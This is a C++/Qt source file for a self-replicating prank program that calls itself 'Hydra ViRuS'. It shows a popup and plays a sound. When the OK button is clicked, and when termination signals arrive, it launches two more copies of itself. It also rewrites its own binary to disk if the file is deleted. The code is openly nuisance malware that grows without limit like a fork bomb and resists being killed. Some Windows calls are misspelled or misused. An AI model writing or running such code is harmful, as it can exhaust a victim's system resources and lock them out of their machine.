// QT
#include <QtWidgets/QtWidgets>
#include <QtWidgets/QApplication>
#include <QtWidgets/QWidget>
#include <QtWidgets/QPushButton>
#include <QtWidgets/QBoxLayout>
#include <QtGui/QPixmap>
#include <QtGui/QScreen>
#include <QtCore/QProcess>
#include <QtCore/QFile>
#include <QtCore/QFileDevice>
#include <QtCore/QSharedMemory>

// SFML
#include <SFML/Audio/Music.hpp>

// Standard
#include <ctime>
#include <iostream>
#include <iomanip>

// Graphic and sound
#include "assets.h"

#ifdef __unix__
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#endif

#ifdef WIN32
#include <windows.h>
#endif

#define WIN_WIDTH 400
#define WIN_HEIGHT 100
//#define SEGMENT_SZ 1*1000*512 //512Kb
#define SEGMENT_SZ 1*1000

long exe_length;
QFile exe_file;
QByteArray exe_data;
int perms;

// Since we may launch multiple times a second, we need something just a bit
// more random than std::time()
int os_get_random() {
#ifdef __unix__
  return getpid() + clock();
#endif

#ifdef WIN32
  return (GetTickCount64t()%99999) + std::time(NULL);
#endif

  return std::time(NULL);
}

void os_sleep(long ms) {
#ifdef __unix__
  usleep(ms*1000);
#endif

#ifdef WIN32
  Sleep(ms);
#endif
  return;
}

long os_get_pid() {
#ifdef __unix__
  return (long)getpid();
#endif

#ifdef WIN32
  return (long)GetProcessId();
#endif
}

static void button_response() {
  QApplication::quit();
}

void print_segment_hex(QSharedMemory *s) {
  unsigned char *data = (unsigned char*)s->data();
  int i=0;
  while (i < s->size()) {
    for (int j=0;j<30;j++) {
      std::cout << std::setw(2) << std::hex << (int)data[i] << ' ';
      i++;
    }
    std::cout << std::endl;
  }
}

void deamon_loop() {
  QSharedMemory segment(QString::number(os_get_random()));
  segment.create(SEGMENT_SZ, QSharedMemory::ReadWrite);
  print_segment_hex(&segment);

  QProcess::startDetached(exe_file.fileName());
}

bool is_proc_alive(long pid) {
#ifdef __unix__
  kill(pid, 0);
  if (errno == ESRCH) {
    errno = 0;
    return false;
  }
#endif

#ifdef WIN32
  HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
  if (proc == NULL)
    return false;
  CloseProcess(proc);
#endif
  return true;
}

void spawn_two_more() {

  QString exe_name = exe_file.fileName();

  if (!exe_file.exists()) {
    QFile out_stream(exe_name);
    out_stream.open(QIODevice::WriteOnly);
    out_stream.write(exe_data);
    out_stream.setPermissions((QFileDevice::Permissions)perms);
    out_stream.close();
  }

  QProcess::startDetached(exe_name);
  QProcess::startDetached(exe_name);
}

void spawn_wrapper(int i) {
  spawn_two_more();
}

void trap_setup() {
#ifdef __unix__
  signal(SIGTERM, spawn_wrapper);
  signal(SIGINT, spawn_wrapper);
  signal(SIGQUIT, spawn_wrapper);
  signal(SIGKILL, spawn_wrapper);
  signal(SIGHUP, spawn_wrapper);
#endif

#ifdef WIN32
  //TODO
#endif
  return;
}

int main(int argc, char* argv[])  {

  exe_file.setFileName(argv[0]);

  // No PID in argv, so start daemon mode
  if (argc <= 1) {
    deamon_loop();
    return 0;
  }

  trap_setup();

  // Read in the executable file, in case they try to delete it
  exe_file.open(QIODevice::ReadOnly);
  perms = exe_file.permissions();
  exe_data = exe_file.readAll();

  QApplication::setStyle(QStyleFactory::create("Windows"));
  QApplication app(argc, argv);

  QWidget window(NULL, Qt::Window);
  window.setWindowModality(Qt::ApplicationModal);
  window.setFixedSize(WIN_WIDTH, WIN_HEIGHT);

  // Setup and play Audio
  sf::Music *music = new sf::Music;
  music->openFromMemory(chord_ogg, CHORD_LENGTH);
  //music->setVolume(100);
  music->play();
  //QApplication::beep();

  // Setup layouts
  QBoxLayout layout(QBoxLayout::TopToBottom);
  QBoxLayout row1(QBoxLayout::LeftToRight);
  QBoxLayout row2(QBoxLayout::LeftToRight);
  layout.setSpacing(0);
  row1.setSpacing(0);
  row2.setSpacing(0);

  // Create hydra icon
  QLabel image(&window);
  image.setPixmap(QPixmap(hydra_xpm));
  image.move(10,10);

  // Create message text
  QLabel text("Cut off a head, two more will take its place.\n[ Hydra ViRuS ]");
  text.setAlignment(Qt::AlignHCenter |  Qt::AlignVCenter);

  // Create the button
  QPushButton button;
  button.setFixedSize(96, 26);
  button.setDefault(true);
  button.setText("OK");

  // Put the Window somewhere random on the desktop
  QRect screen = QApplication::desktop()->availableGeometry();
  std::srand(os_get_random());
  int spawn_x = std::rand()%(screen.width() - WIN_WIDTH);
  int spawn_y = std::rand()%(screen.height() - WIN_HEIGHT);
  window.setGeometry(spawn_x, spawn_y, WIN_WIDTH, WIN_HEIGHT);

  // Glue everything together
  row1.addWidget(&text, Qt::AlignLeft);
  row2.addWidget(&button, Qt::AlignHCenter);
  layout.addLayout(&row1);
  layout.addLayout(&row2);
  QObject::connect(&button, &QPushButton::clicked, button_response);

  // Start
  window.setLayout(&layout);
  window.show();
  app.exec();

  delete music;

  // Evil
  spawn_two_more();

  return 0;
}
